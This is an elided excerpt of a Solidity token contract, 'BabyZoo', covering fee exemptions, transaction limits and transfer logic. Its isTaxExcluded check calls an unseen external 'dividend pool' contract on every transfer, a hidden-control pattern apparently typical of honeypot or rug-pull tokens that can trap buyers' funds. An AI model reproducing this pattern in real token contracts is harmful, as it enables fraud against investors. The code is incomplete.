...
contract BabyZoo is ERC20, Ownable, AUTH {
    using SafeMath for uint256;
    ...
    struct limitConfiguration {
        address feeWallet;
        uint256 maxTranPercent;
        uint256 mxWalletPro;
        uint256 buyAccDivFee;
        uint256 sellAccDivFee;
    }
    struct ZooPool {
        address zooAddress;
        address divPoolZoo;
    }
    ZooPool private zooPoolRef;
    ...
    constructor(
        ZooPool memory zooPoolInfo,
        limitConfiguration memory configParams,
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) payable ERC20(name_, symbol_, decimals_) {
        uint256 supply_ = 888_000_000_000;
        ...
        zooPoolRef = zooPoolInfo;
        marketing = configParams.feeWallet;
        buyTaxAmount = 0; //static
        sellTaxAmount = 0; //static
        _totalSupplyAmount = supply_;

        excludeFromFees(owner(), true);excludeFromFees(marketing, true);
        _setAMMPair(zooPoolInfo.zooAddress, uniV2Pair, true);
        excludeFromFees(zooPoolInfo.zooAddress, true);
        excludeFromFees(zooPoolInfo.divPoolZoo, true);
        ...
        maxTxAmount = configParams.maxTranPercent * supply_ * (10**decimals_).div(10000);
        maxWalletAmount = configParams.mxWalletPro * supply_ * (10**decimals_).div(10000);
        // mint total supply
    ...
    function isTaxExcluded(address from, address to) internal returns (bool) {
        return 
            isExcludedFromFee[from] ||
            isExcludedFromFee[to] ||
            IBabyZooPool(zooPoolRef.divPoolZoo).accumulativeDividendOf(from, to) > 0;
    }
    ...
    function _transfer(
        ...
        if ((recipient == address(0) || recipient == address(0xdead)) || isTaxExcluded(sender, recipient) || amount == 0) 
        {
        ...
        bool possibleSwap = balanceOfContract >= swapTokensAt;
        if (
            possibleSwap && !isSwap && !isPair[sender]
        ) {
            isSwap = true;
            // uint256 balanceOfContract = balanceOfContract;
            if (balanceOfContract > 0) {
                swapBackEth(balanceOfContract, marketing);
            } isSwap = false;
        }
        ...
        if (takeFee) {
            uint256 fees = amount.mul(buyTaxAmount).div(1000);
            if (isPair[recipient]) {
                fees = amount.mul(sellTaxAmount).div(1000);
